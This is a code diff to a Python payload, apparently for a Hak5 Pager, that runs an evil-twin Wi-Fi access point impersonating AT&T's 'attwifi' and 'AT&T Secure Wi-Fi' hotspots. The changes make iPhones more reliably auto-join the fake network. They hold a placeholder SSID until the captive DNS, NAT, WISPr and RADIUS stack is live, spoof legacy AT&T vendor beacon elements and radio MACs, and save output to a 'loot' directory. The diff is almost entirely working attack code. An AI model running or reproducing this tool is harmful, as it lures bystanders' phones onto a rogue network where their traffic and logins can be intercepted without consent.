@@ -85,6 +85,16 @@ CHANNEL     = 6
 
 SSID_OPEN = "attwifi"
 SSID_ENT  = "AT&T Secure Wi-Fi"
+# During bring-up the open BSS beacons this harmless placeholder so an AT&T
+# iPhone does not auto-join `attwifi` before the captive stack (DNS override,
+# NAT, WISPr) is ready -- which makes iOS drop it and disable auto-join. The
+# live SSID is flipped to `attwifi` only once everything is up.
+SSID_SETUP = "_att-open-steer"
+# IE-221 vendor elements (Cisco 00:40:96, Aruba 00:1a:1e, Ruckus 00:1b:0d) that
+# legacy AT&T open hotspots used. hostapd's `vendor_elements` is a concatenated
+# hex string (no colons): each IE is  dd <len> <OUI:3> <vendor-data:4>  with
+# len = 3 + 4 = 0x07. Set via UCI so it survives the activation `wifi reload`.
+VENDOR_ELEMENTS = "dd0700409600000001dd07001a1e00000001dd07001b0d00000001"
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 
@@ -121,10 +131,15 @@ WPAD_SCRIPT = _resolve_wpad_swap()
 
 LOG_DIR = "/mmc/root/loot/att-open-steer"
 
-WIRELESS_BAK  = "/tmp/att-open-steer-wireless.bak"
-DNSMASQ_BAK   = "/tmp/att-open-steer-dnsmasq.conf.bak"
-RADIO_MAC_BAK = "/tmp/att-open-steer-radio-mac.bak"
-PINEAP_BAK    = "/tmp/att-open-steer-pineapd.bak"
+# Backups live on persistent storage (/mmc), NOT /tmp: /tmp is cleared on
+# reboot, which previously left the Pager stuck in the payload's modified
+# wireless/pineapd state (the disable flags survived, the /tmp backup needed to
+# restore them did not).
+STATE_DIR     = "/mmc/root/.att-open-steer"
+WIRELESS_BAK  = os.path.join(STATE_DIR, "wireless.bak")
+DNSMASQ_BAK   = os.path.join(STATE_DIR, "dnsmasq.conf.bak")
+RADIO_MAC_BAK = os.path.join(STATE_DIR, "radio-mac.bak")
+PINEAP_BAK    = os.path.join(STATE_DIR, "pineapd.bak")
 
 WISPR_PORT    = 80
 RADIUS_SECRET = "testing123"
@@ -138,6 +153,8 @@ DNSMASQ_UCI   = "dhcp.@dnsmasq[0]"
 DNSMASQ_PROBE = "attwifi.apple.com"
 DNSMASQ_CONF  = "/etc/dnsmasq.conf"
 DNSMASQ_MARK  = "# att-open-steer captive"
+DNS_FALLBACK_MARK = "# att-open-steer dns-fallback"
+DNS_FALLBACK_SERVERS = ("1.1.1.1", "8.8.8.8")
 
 
 # ---------------------------------------------------------------------------
@@ -174,6 +191,10 @@ def uci_commit(target="wireless"):
 
 def backup_file(path, bak_path):
     if os.path.exists(path) and not os.path.exists(bak_path):
+        try:
+            os.makedirs(os.path.dirname(bak_path), exist_ok=True)
+        except OSError:
+            pass
         with open(path, "rb") as src, open(bak_path, "wb") as dst:
             dst.write(src.read())
         return True
@@ -306,10 +327,31 @@ def set_radio_macs(log_fp):
     log(f"[radio] macaddr_base={RADIO_BASE} num_global_macaddr=4", log_fp)
 
 
+def follow_uplink_channel(log_fp):
+    """Put the AP radio on the same channel as the client-mode uplink.
+
+    AP and STA share phy0, so the radio can only sit on one channel. If the
+    AP is forced to a fixed channel (the old hardcoded 6) it drags the STA off
+    its network -- which is why switching client mode to a different SSID/
+    channel broke the uplink. Set radio0.channel from the associated STA (or
+    leave the configured value if there is no uplink/unknown).
+    """
+    ifc = sta_iface() or op_iface()
+    ch = iface_channel(ifc)
+    if ch:
+        uci_set("wireless.radio0.channel", str(ch))
+        uci_commit("wireless")
+        log(f"[radio] radio0.channel={ch} (following STA {ifc})", log_fp)
+    else:
+        log(f"[radio] no STA channel detected on {ifc}; leaving channel as configured", log_fp)
+
+
 def configure_open_bss(log_fp):
-    """Open `attwifi` -- the phone's managed-OPEN profile; the connect
-    target. Keep inactivity timeouts off so the phone stays put."""
-    uci_set("wireless.wlan0open.ssid", SSID_OPEN)
+    """Open BSS -- the phone's managed-OPEN profile; the connect target.
+    Beacons a placeholder SSID during setup; activate_open_ssid() flips it to
+    `attwifi` once DNS/WISPr/NAT are ready. Keep inactivity timeouts off so
+    the phone stays put."""
+    uci_set("wireless.wlan0open.ssid", SSID_SETUP)
     uci_set("wireless.wlan0open.encryption", "none")
     uci_set("wireless.wlan0open.hidden", "0")
     uci_set("wireless.wlan0open.disabled", "0")
@@ -317,6 +359,8 @@ def configure_open_bss(log_fp):
     uci_set("wireless.wlan0open.skip_inactivity_poll", "1")
     uci_set("wireless.wlan0open.disassoc_low_ack", "0")
     uci_set("wireless.wlan0open.max_inactivity", "86400")
+    # Legacy AT&T-hotspot IE-221 vendor OUIs (survives wifi reload via UCI).
+    uci_set("wireless.wlan0open.vendor_elements", VENDOR_ELEMENTS)
     # The 802.11k/v options (ieee80211k/bss_transition/rrm_neighbor_report) are
     # compiled only into wpad-wolfssl. On the factory wpad they make hostapd
     # reject the whole BSS ("unknown configuration item 'bss_transition'" ->
@@ -326,7 +370,34 @@ def configure_open_bss(log_fp):
     for k in ("ieee80211k", "bss_transition", "rrm_neighbor_report"):
         uci_del(f"wireless.wlan0open.{k}")
     uci_commit()
-    log(f"[open] {AP_OPEN} = open {SSID_OPEN!r}", log_fp)
+    log(f"[open] {AP_OPEN} = open {SSID_SETUP!r} (placeholder; attwifi on ready)", log_fp)
+
+
+def activate_open_ssid(log_fp):
+    """Flip the open BSS from the placeholder to `attwifi`.
+
+    On this firmware `hostapd_cli set ssid` only updates hostapd's internal
+    config -- the kernel beacon keeps the old SSID, so iPhones that match
+    passively never see `attwifi`. A `wifi reload` with UCI=attwifi DOES
+    regenerate the conf and put `attwifi` on the air, so use that. It briefly
+    restarts the client STA; we re-apply the uplink immediately after and
+    re-inject the idle-hold + IE-221 (which a reload wipes).
+    """
+    uci_set("wireless.wlan0open.ssid", SSID_OPEN)
+    uci_set("wireless.wlan0open.hidden", "0")
+    uci_commit("wireless")
+    wifi_reload()
+    # Get the client uplink back ASAP (static re-apply beats waiting on DHCP).
+    reapply_uplink(log_fp)
+    if not verify_bss_up(AP_OPEN, timeout=60):
+        log("[WARN] open BSS did not come back after attwifi activation", log_fp)
+    restore_uplink(log_fp)
+    # NOTE: do NOT HUP hostapd here. The reload just regenerated the conf from
+    # UCI (which carries skip_inactivity_poll / max_inactivity), and a follow-up
+    # HUP on this driver tears the freshly-created BSS back down (wlan0open is
+    # left as an unconfigured AP). Stability settings come from UCI instead.
+    log(f"[bss] {SSID_OPEN!r} is now LIVE on {AP_OPEN} "
+        f"bssid={bss_bssid(AP_OPEN)}", log_fp)
 
 
 def configure_ent_bss(log_fp):
@@ -384,7 +455,9 @@ def _dnsmasq_conf_strip():
     with open(DNSMASQ_CONF) as f:
         lines = f.readlines()
     keep = [l for l in lines
-            if DNSMASQ_MARK not in l and DNSMASQ_PROBE not in l]
+            if DNSMASQ_MARK not in l and DNSMASQ_PROBE not in l
+            and DNS_FALLBACK_MARK not in l
+            and not any(f"server={s}" in l for s in DNS_FALLBACK_SERVERS)]
     with open(DNSMASQ_CONF, "w") as f:
         f.writelines(keep)
 
@@ -432,6 +505,36 @@ def remove_dnsmasq_captive(log_fp):
     log("[dnsmasq] captive override removed", log_fp)
 
 
+def _dnsmasq_fallback_strip():
+    """Remove ONLY the DNS-fallback lines we added (never the captive override)."""
+    if not os.path.exists(DNSMASQ_CONF):
+        return
+    with open(DNSMASQ_CONF) as f:
+        lines = f.readlines()
+    keep = [l for l in lines
+            if DNS_FALLBACK_MARK not in l
+            and not any(f"server={s}" in l for s in DNS_FALLBACK_SERVERS)]
+    with open(DNSMASQ_CONF, "w") as f:
+        f.writelines(keep)
+
+
+def ensure_dns_fallback(log_fp):
+    """If the client-mode uplink handed us no upstream resolver, add public
+    DNS servers to dnsmasq so downstream clients (and the iPhone's secondary
+    reachability check) can still resolve. Works for any uplink/subnet."""
+    auto = shell_out("cat /tmp/resolv.conf.d/resolv.conf.auto 2>/dev/null")
+    if not re.search(r"nameserver\s+\d", auto):
+        _dnsmasq_fallback_strip()
+        with open(DNSMASQ_CONF, "a") as f:
+            f.write(f"\n{DNS_FALLBACK_MARK}\n")
+            for s in DNS_FALLBACK_SERVERS:
+                f.write(f"server={s}\n")
+        shell_out("/etc/init.d/dnsmasq restart >/dev/null 2>&1; true")
+        log(f"[dnsmasq] uplink has no resolver; added fallback {DNS_FALLBACK_SERVERS}", log_fp)
+    else:
+        log("[dnsmasq] uplink resolver present", log_fp)
+
+
 # ---------------------------------------------------------------------------
 # PineAP: stop it beaconing competing SSIDs (notably `attwifi`)
 # ---------------------------------------------------------------------------
@@ -471,10 +574,60 @@ def restore_pineap(log_fp):
 # ---------------------------------------------------------------------------
 # internet routing: give the phone's network DHCP-DNS + NAT out the uplink
 # ---------------------------------------------------------------------------
+def managed_ifaces():
+    """All managed (station-capable) interfaces, from `iw dev`.
+
+    Concrete names differ per Pager/firmware (wlan0cli, wlan1cli, wlan2cli,
+    ...), so never hardcode the client-mode interface.
+    """
+    out = shell_out("iw dev 2>/dev/null")
+    ifs = []
+    cur = None
+    for line in out.splitlines():
+        line = line.strip()
+        if line.startswith("Interface "):
+            cur = line.split()[1]
+        elif line.startswith("type ") and cur:
+            if line.split()[1] in ("managed", "station"):
+                ifs.append(cur)
+    return ifs
+
+
+def sta_iface():
+    """The associated client-mode (STA) interface, or '' if none."""
+    for ifc in managed_ifaces():
+        link = shell_out(f"iw dev {ifc} link 2>/dev/null")
+        if "Connected to" in link or "SSID:" in link:
+            return ifc
+    return ""
+
+
+def op_iface():
+    """Best-effort client-mode uplink interface even when not associated yet."""
+    return sta_iface() or (managed_ifaces()[0] if managed_ifaces() else "wlan0cli")
+
+
+def iface_channel(ifc):
+    """Current channel number of an interface, or None."""
+    if not ifc:
+        return None
+    out = shell_out(f"iw dev {ifc} info 2>/dev/null")
+    m = re.search(r"channel (\d+)", out)
+    if m:
+        return int(m.group(1))
+    # Fall back to the link's frequency.
+    out = shell_out(f"iw dev {ifc} link 2>/dev/null")
+    f = re.search(r"freq:\s*(\d+)", out)
+    if f:
+        return _freq_to_ch(int(f.group(1)))
+    return None
+
+
 def uplink_iface():
     """The Pager's current internet uplink interface (client Wi-Fi / eth).
 
     Parse ONLY the `default via ... dev X` route; ignore link-scope routes.
+    Falls back to the associated STA interface before it has a route.
     """
     out = shell_out("ip route show default 2>/dev/null")
     for line in out.splitlines():
@@ -484,6 +637,46 @@ def uplink_iface():
     return ""
 
 
+def uplink_subnet():
+    """CIDR of the uplink's IPv4 address, or ''."""
+    up = uplink_iface()
+    if not up:
+        return ""
+    out = shell_out(f"ip -o -4 addr show {up} 2>/dev/null")
+    m = re.search(r"inet (\d+\.\d+\.\d+\.\d+/\d+)", out)
+    return m.group(1) if m else ""
+
+
+def warn_on_overlap(log_fp):
+    """The AP gateway (br-lan 172.16.52.0/24) must not share the uplink's
+    subnet, or the phone's traffic is routed to the wrong interface."""
+    cidr = uplink_subnet()
+    if not cidr:
+        return
+    net = cidr.split("/")[0].rsplit(".", 1)[0]
+    if net == "172.16.52":
+        log(f"[net] WARNING: uplink subnet {cidr} overlaps br-lan "
+            "172.16.52.0/24; passthrough may break", log_fp)
+
+
+def bring_up_client(log_fp):
+    """Ask netifd to (re)bring up the client-mode interface, then wait for the
+    STA to associate. Works for any client-mode SSID/subnet."""
+    ifc = op_iface()
+    # Already associated (e.g. right after a reload): don't restart DHCP and
+    # throw away a good link.
+    if "Connected to" in shell_out(f"iw dev {ifc} link 2>/dev/null"):
+        return ifc
+    shell_out("ifup cli >/dev/null 2>&1; true")
+    shell_out("ubus call network.interface.cli up >/dev/null 2>&1; true")
+    deadline = time.time() + 20
+    while time.time() < deadline:
+        if "Connected to" in shell_out(f"iw dev {ifc} link 2>/dev/null"):
+            return ifc
+        time.sleep(1)
+    return ifc
+
+
 def restore_uplink(log_fp, timeout=70):
     """Wait for the client-WiFi uplink to have a default route, actively
     re-requesting DHCP and, failing that, re-applying the snapshotted static
@@ -491,16 +684,15 @@ def restore_uplink(log_fp, timeout=70):
     deadline = time.time() + timeout
     nudged = False
     reapplied = False
+    upif = bring_up_client(log_fp)
     while time.time() < deadline:
         up = uplink_iface()
         if up and up not in ("br-lan", "br-att"):
             log(f"[net] uplink up: {up}", log_fp)
+            warn_on_overlap(log_fp)
             return True
-        upif = ""
-        for ifc in ("wlan0cli", "wlan1cli", "wlan2cli"):
-            if "type managed" in shell_out(f"iw dev {ifc} info 2>&1"):
-                upif = ifc
-                break
+        # Re-read the STA (association may have moved to another iface).
+        upif = sta_iface() or upif or op_iface()
         if upif and not nudged:
             log(f"[net] nudging DHCP on {upif}", log_fp)
             shell_out(f"killall udhcpc 2>/dev/null; "
@@ -512,39 +704,53 @@ def restore_uplink(log_fp, timeout=70):
             reapplied = True
         else:
             shell_out("wifi up >/dev/null 2>&1; true")
+            bring_up_client(log_fp)
         time.sleep(3)
     # one last hard attempt
     if _UPLINK_SNAP.get("addr"):
         reapply_uplink(log_fp)
     ok = uplink_iface() not in ("", None, "br-lan", "br-att")
-    if not ok:
+    if ok:
+        warn_on_overlap(log_fp)
+    else:
         log("[net] WARNING: uplink still down; phone may lack internet", log_fp)
     return ok
 
 
-_net_rules = {"done": False}
+_net_rules = {"key": None}
 
 
-def ensure_internet_routing(ap_ifaces, log_fp, force=False):
-    """NAT + forward the AP networks out the real uplink.
-
-    Hak5's fw4 often omits the client-Wi-Fi uplink from the wan-zone NAT so
-    downstream clients get an IP but no internet -> iOS drops the network.
-    Idempotent; safe to call repeatedly (used as a self-heal in the loop).
-    """
-    up = uplink_iface()
-    if not up or up in ("br-lan", "br-att"):
-        return False
-    if _net_rules["done"] and not force:
-        return True
-
+def _routing_bridges(ap_ifaces):
     bridges = set()
     for ifc in ap_ifaces:
         m = shell_out(f"ip link show {ifc} 2>/dev/null | grep -o 'master [a-z0-9-]*'")
         if m:
             bridges.add(m.split()[1])
-    if not bridges:
-        bridges = {"br-lan"}
+    return bridges or {"br-lan"}
+
+
+def ensure_internet_routing(ap_ifaces, log_fp, force=False):
+    """NAT + forward the AP networks out the real uplink.
+
+    Hak5's fw4 may omit the client-Wi-Fi uplink from the wan-zone NAT so
+    downstream clients get an IP but no internet -> iOS drops the network.
+    Tracks the (uplink, bridges) key so a changed uplink (new client-mode
+    network with a different iface/zone) re-applies cleanly: on change we
+    reload the firewall to discard stale oifname rules, then re-add.
+    """
+    up = uplink_iface()
+    if not up or up in ("br-lan", "br-att"):
+        return False
+
+    bridges = _routing_bridges(ap_ifaces)
+    key = up + "|" + ",".join(sorted(bridges))
+    if _net_rules["key"] == key and not force:
+        return True
+
+    if _net_rules["key"] and _net_rules["key"] != key:
+        # Uplink changed: regenerate fw4 so our old oifname rules do not linger.
+        log(f"[net] uplink changed ({_net_rules['key']} -> {key}); reloading firewall", log_fp)
+        shell_out("/etc/init.d/firewall reload >/dev/null 2>&1; true")
 
     ruleset = shell_out("nft list ruleset 2>/dev/null")
     for br in sorted(bridges):
@@ -561,7 +767,7 @@ def ensure_internet_routing(ap_ifaces, log_fp, force=False):
         log(f"[net] routed {br} -> {up} (NAT + forward)", log_fp)
 
     shell_out("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1; true")
-    _net_rules["done"] = True
+    _net_rules["key"] = key
     return True
 
 
@@ -754,7 +960,72 @@ def inject_hold_station(iface=AP_OPEN, log_fp=None):
 # ---------------------------------------------------------------------------
 # run loop
 # ---------------------------------------------------------------------------
+def normalize_wireless(log_fp):
+    """Reset any leftover lure vif state to factory BEFORE we snapshot it.
+
+    An interrupted previous run can leave /etc/config/wireless with
+    wlan0open=attwifi (enabled) and radio0.macaddr_base set -- which means the
+    Pager keeps broadcasting `attwifi` from its own hostapd outside the
+    payload (no WISPr/DNS/NAT), poisoning iOS auto-join. If we snapshotted that
+    we would restore it on cleanup and perpetuate the problem. Detect and
+    normalize it first so the backup (and the restored state) is clean.
+    """
+    dirty = False
+    if shell_out("uci -q get wireless.wlan0open.ssid 2>/dev/null") in ("attwifi", SSID_SETUP):
+        uci_set("wireless.wlan0open.ssid", "pager-open")
+        uci_set("wireless.wlan0open.disabled", "1")
+        for k in ("encryption", "hidden", "skip_inactivity_poll",
+                  "disassoc_low_ack", "max_inactivity", "ieee80211k",
+                  "bss_transition", "rrm_neighbor_report", "vendor_elements"):
+            uci_del(f"wireless.wlan0open.{k}")
+        dirty = True
+    if shell_out("uci -q get wireless.wlan0wpa.ssid 2>/dev/null") == "AT&T Secure Wi-Fi":
+        uci_set("wireless.wlan0wpa.ssid", "pager-wpa")
+        uci_set("wireless.wlan0wpa.disabled", "1")
+        dirty = True
+    if shell_out("uci -q get wireless.radio0.macaddr_base 2>/dev/null"):
+        uci_del("wireless.radio0.macaddr_base")
+        uci_del("wireless.radio0.num_global_macaddr")
+        dirty = True
+    if dirty:
+        uci_commit("wireless")
+        log("[normalize] reset leftover lure vifs to factory before backup", log_fp)
+
+
+def recover_stale_state(log_fp):
+    """Restore persistent backups left by an interrupted run (hard kill or
+    reboot mid-run), so we start from a clean slate instead of stacking
+    changes. No-op when there is nothing stale."""
+    restored = False
+    if os.path.exists(WIRELESS_BAK):
+        subprocess.run(["cp", WIRELESS_BAK, "/etc/config/wireless"], check=False)
+        os.remove(WIRELESS_BAK)
+        restored = True
+    if os.path.exists(PINEAP_BAK):
+        subprocess.run(["cp", PINEAP_BAK, "/etc/config/pineapd"], check=False)
+        os.remove(PINEAP_BAK)
+        restored = True
+    if os.path.exists(RADIO_MAC_BAK):
+        try:
+            with open(RADIO_MAC_BAK) as f:
+                orig = f.read().strip()
+            if orig:
+                shell_out(f"echo {orig} > /sys/class/ieee80211/phy0/macaddress")
+        except OSError:
+            pass
+        os.remove(RADIO_MAC_BAK)
+        restored = True
+    if restored:
+        log("[recover] restored stale backups from a previous interrupted run", log_fp)
+        wpad_swap("stock", log_fp)
+        shell_out("wifi reload >/dev/null 2>&1; true")
+        shell_out("/etc/init.d/pineapd restart >/dev/null 2>&1; true")
+
+
 def run(args, log_fp):
+    # Clean up any state left by a previous interrupted run BEFORE snapshotting
+    # the uplink (the recovery may do a wifi reload).
+    recover_stale_state(log_fp)
     assert_safe_shell()
     # capture the uplink's current address BEFORE we touch the radio
     snapshot_uplink(log_fp)
@@ -766,6 +1037,10 @@ def run(args, log_fp):
         if not wpad_swap("wolfssl", log_fp):
             log("[FATAL] wpad-wolfssl unavailable", log_fp)
             return 1
+
+    # Reset any leftover lure vifs to factory so the backup we take (and thus
+    # what cleanup restores) is clean, not a polluted previous-run state.
+    normalize_wireless(log_fp)
 
     backup_file("/etc/config/wireless", WIRELESS_BAK)
     if os.path.exists("/sys/class/ieee80211/phy0/macaddress"):
@@ -781,6 +1056,9 @@ def run(args, log_fp):
     configure_open_bss(log_fp)
     if args.enterprise:
         configure_ent_bss(log_fp)
+    # AP and STA share phy0: follow the client-mode uplink's channel so the
+    # AP bring-up does not drag the STA off a different network.
+    follow_uplink_channel(log_fp)
     stop_pineapd()
     wifi_reload()
 
@@ -790,8 +1068,6 @@ def run(args, log_fp):
     if args.enterprise and not verify_bss_up(AP_ENT, timeout=90):
         log("[WARN] enterprise (Passpoint) BSS did not come up", log_fp)
     time.sleep(2)
-    if CHANNEL:
-        shell_out(f"iw phy phy0 set channel {CHANNEL} 2>/dev/null; true")
 
     # The AP bring-up (wpad restart + wifi reload) shares phy0 with the
     # wlan0cli uplink and often knocks the uplink offline. Wait for it to
@@ -804,7 +1080,7 @@ def run(args, log_fp):
     if args.enterprise:
         inject_hold_station(AP_ENT, log_fp)
 
-    log(f"[bss] {SSID_OPEN!r:22} {AP_OPEN} bssid={bss_bssid(AP_OPEN)}", log_fp)
+    log(f"[bss] setup {SSID_SETUP!r:18} {AP_OPEN} bssid={bss_bssid(AP_OPEN)}", log_fp)
     if args.enterprise:
         log(f"[bss] {SSID_ENT!r:22} {AP_ENT} bssid={bss_bssid(AP_ENT)}", log_fp)
 
@@ -838,9 +1114,11 @@ def run(args, log_fp):
     # Give the phone's network real internet (NAT out the uplink). Without this
     # iOS marks the network "no internet" and disconnects after ~10-30s.
     ensure_internet_routing([AP_OPEN, AP_ENT], log_fp)
+    ensure_dns_fallback(log_fp)
 
     # IE-221 OUIs on the open attwifi (legacy hotspot signature)
-    shell_out(f"{sys.executable or 'python3'} {IE221_SCRIPT} --ifname {AP_OPEN}")
+    shell_out(f"{sys.executable or 'python3'} {IE221_SCRIPT} "
+              f"--ifname {AP_OPEN} --conf /var/run/hostapd-phy0.conf")
     shell_out("killall -HUP hostapd 2>/dev/null; true")
     time.sleep(1)
 
@@ -859,6 +1137,12 @@ def run(args, log_fp):
     # WISPr portal on the open twin
     args.server_ip = server_ip
     wispr = start_wispr(args, server_ip, log_fp)
+
+    # Captive stack is up (DNS override + NAT + WISPr). ONLY NOW flip the live
+    # SSID to `attwifi`, so an iPhone never auto-joins a half-configured AP and
+    # disables auto-join.
+    time.sleep(2)
+    activate_open_ssid(log_fp)
 
     loop(args, log_fp, radius, wispr)
     return 0
@@ -1119,10 +1403,10 @@ def loop(args, log_fp, radius, wispr):
 
         if now - last_status > 30:
             last_status = now
-            # self-heal: (re)install NAT/forward rules once the uplink is back,
-            # and re-apply the uplink address if it flapped.
-            if not _net_rules["done"]:
-                ensure_internet_routing([AP_OPEN, AP_ENT], log_fp)
+            # self-heal: (re)install NAT/forward rules (also re-applies if the
+            # client-mode uplink changed), and re-apply the uplink address if
+            # it flapped.
+            ensure_internet_routing([AP_OPEN, AP_ENT], log_fp)
             if uplink_iface() in ("", None, "br-lan", "br-att"):
                 reapply_uplink(log_fp)
             log(f"[status] ent_stas={len(stations(AP_ENT))} "
@@ -1177,6 +1461,14 @@ def cleanup(args, log_fp):
     wpad_swap("stock", log_fp)
     restore_pineap(log_fp)
     start_pineapd()
+    # Clear our PID file only if it still points at us (a newer run may have
+    # started while we were tearing down).
+    try:
+        with open("/tmp/att-open-steer.pid") as pf:
+            if pf.read().strip() == str(os.getpid()):
+                os.remove("/tmp/att-open-steer.pid")
+    except OSError:
+        pass
     log("[cleanup] done", log_fp)
 
 
@@ -1208,6 +1500,13 @@ def main():
     run_id = datetime.now().strftime("%Y%m%d-%H%M%S")
     args.run_dir = os.path.join(args.loot_dir, f"run-{run_id}")
     os.makedirs(args.run_dir, exist_ok=True)
+    os.makedirs(STATE_DIR, exist_ok=True)
+    # Record our PID so the launcher/toggle can find and stop this exact run.
+    try:
+        with open("/tmp/att-open-steer.pid", "w") as pf:
+            pf.write(str(os.getpid()))
+    except OSError:
+        pass
     log_fp = open(os.path.join(args.run_dir, "run.log"), "a", buffering=1)
     log(f"att-open-steer starting isolate={args.isolate} "
         f"enterprise={args.enterprise} steer-mode={args.steer_mode} "
@@ -1223,6 +1522,11 @@ def main():
 
     def _on_signal(signum, frame):
         log(f"[signal] {signum}", log_fp)
+        # A second signal (the launcher signals both the PID file and a pgrep
+        # match) must NOT re-enter the handler and abort the in-progress
+        # restore. Ignore any signal once cleanup has begun.
+        if _cleanup_done[0]:
+            return
         cleanup(args, log_fp)
         sys.exit(0)
 
